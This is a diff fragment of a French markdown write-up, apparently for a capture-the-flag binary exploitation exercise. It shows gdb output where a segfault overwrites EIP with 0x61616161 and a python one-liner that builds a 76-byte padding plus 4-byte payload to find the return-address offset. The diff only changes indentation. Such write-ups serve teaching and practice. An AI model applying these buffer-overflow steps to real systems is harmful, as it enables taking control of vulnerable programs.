@@ -74,10 +74,10 @@
         Program received signal SIGSEGV, Segmentation fault.
         0x61616161 in ?? ()
       ```
-    - Nice, on SegFault comme attendu et l'eip est réécrit avec des a:
-      ```
-        eip            0x61616161       0x61616161
-      ```
+      - Nice, on SegFault comme attendu et l'eip est réécrit avec des a:
+        ```
+          eip            0x61616161       0x61616161
+        ```
 - L' EIP étant codé sur 4 octets dans un système 32bits, on devrait pouvoir écrire l'adresse de run dans les 4 derniers octets, on vérifie avec un exploit de 76 "a" et 4 "b" :
   - `python -c 'print "a" * 76 + "b" * 4' > /tmp/exploit`
     ```
